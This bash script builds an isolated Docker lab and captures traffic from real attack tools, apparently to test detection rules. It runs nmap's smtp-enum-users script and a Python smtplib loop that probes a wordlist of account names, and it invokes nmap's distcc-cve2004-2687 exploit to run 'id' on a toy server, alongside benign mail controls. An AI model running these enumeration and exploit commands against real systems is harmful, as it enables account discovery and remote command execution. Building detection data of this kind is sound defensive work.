#!/bin/bash
# Out-of-sample data for the ENG-14 SMTP-enumeration and distcc rules, from REAL attack tooling that the rules were not written from:
# nmap NSE smtp-enum-users (VRFY and RCPT methods) and distcc-cve2004-2687 (the distcc remote-command-execution exploit script),
# against small toy servers (scripts/lab/servers.py) in an isolated Docker network with no route out. Benign controls: an ordinary
# smtplib delivery, and a mailing-list run of 40 recipients of which 4 (10%) are stale addresses.
#   bash scripts/lab/smtp_distcc_lab.sh [outdir]      needs docker; images python:3.11-slim, instrumentisto/nmap, nicolaka/netshoot
set -euo pipefail
export MSYS_NO_PATHCONV=1
OUT="${1:-data/lab_eng14}"; mkdir -p "$OUT"; OUTW="$(cd "$OUT" && pwd -W 2>/dev/null || pwd)"
LAB="$(cd "$(dirname "$0")" && pwd)"; LABW="$(cd "$LAB" && pwd -W 2>/dev/null || pwd)"
NET=stealthtap-lab2
cleanup() { docker rm -f lab-mta lab-sniff2 >/dev/null 2>&1 || true; docker network rm $NET >/dev/null 2>&1 || true; }
trap cleanup EXIT; cleanup
docker network create --internal $NET >/dev/null
docker run -d --name lab-mta --network $NET -v "$LABW:/lab:ro" python:3.11-slim python -W ignore /lab/servers.py >/dev/null
sleep 4
sniff() { docker run -d --name lab-sniff2 --network container:lab-mta --cap-add NET_RAW --cap-add NET_ADMIN -v "$OUTW:/cap" nicolaka/netshoot \
            tcpdump -i eth0 -U -s 0 -w "/cap/$1.pcap" tcp port 25 or tcp port 3632 >/dev/null; sleep 3; }
unsniff() { sleep 2; docker stop lab-sniff2 >/dev/null; docker rm lab-sniff2 >/dev/null; }
nmap() { docker run --rm --network $NET -v "$LABW:/lab:ro" instrumentisto/nmap -Pn "$@"; }

echo "== benign: ordinary mail delivery + a mailing-list run with 10% stale addresses"
sniff smtp_benign
docker run --rm -i --network $NET -v "$LABW:/lab:ro" python:3.11-slim python -W ignore - <<'PY'
import smtplib
s = smtplib.SMTP("lab-mta", 25); s.helo("client.example"); s.sendmail("a@example.org", ["alice@lab"], "Subject: hi\r\n\r\nhello"); s.quit()
s = smtplib.SMTP("lab-mta", 25); s.helo("lists.example")
ok = ["alice", "bob", "ops", "mail", "admin", "root"]
for i in range(40):
    rcpt = "gone%d" % i if i % 10 == 0 else ok[i % len(ok)]
    s.docmd("MAIL FROM:<list@example.org>") if i == 0 else None
    s.docmd("RCPT TO:<%s@lab>" % rcpt)
s.quit()
PY
unsniff

echo "== attack 1: nmap smtp-enum-users, VRFY + RCPT methods (real NSE, wordlist of 60 names)"
sniff smtp_nmap_enum
printf "root\nadmin\nalice\nbob\nguest\nmail\nwww-data\nftp\nnobody\noracle\npostgres\nmysql\ntest\nuser\nops\nsupport\nsales\nbackup\ndaemon\nsys\n" > "$LAB/enum.lst"
for i in 1 2 3; do sed -n '1,20p' "$LAB/enum.lst" | sed "s/^/x$i-/"; done >> "$LAB/enum.lst"
nmap -p 25 --script smtp-enum-users --script-args 'smtp-enum-users.methods={VRFY,RCPT},userdb=/lab/enum.lst' lab-mta | sed -n '6,14p'
unsniff

echo "== attack 1b: account enumeration with Python smtplib (a different client implementation): 30 VRFY probes, then 30 RCPT probes"
sniff smtp_smtplib_enum
docker run --rm -i --network $NET python:3.11-slim python -W ignore - <<'PY'
import smtplib
names = ["root","admin","alice","bob","guest","mail","www-data","ftp","nobody","oracle","postgres","mysql","test","user","ops",
         "support","sales","backup","daemon","sys","info","webmaster","sysadmin","hr","dev","git","jenkins","nagios","zabbix","svc"]
s = smtplib.SMTP("lab-mta", 25); s.helo("scanner.example")
for n in names: s.verify(n)
s.quit()
s = smtplib.SMTP("lab-mta", 25); s.helo("scanner.example"); s.docmd("MAIL FROM:<probe@example.org>")
for n in names: s.docmd("RCPT TO:<%s@lab>" % n)
s.quit()
PY
unsniff

echo "== attack 2: nmap distcc-cve2004-2687 (real NSE exploit script for distcc remote command execution)"
sniff distcc_nmap_exploit
nmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-cve2004-2687.cmd=id' lab-mta | sed -n '6,12p'
unsniff
rm -f "$LAB/enum.lst"
ls -la "$OUT"/smtp_*.pcap "$OUT"/distcc_*.pcap
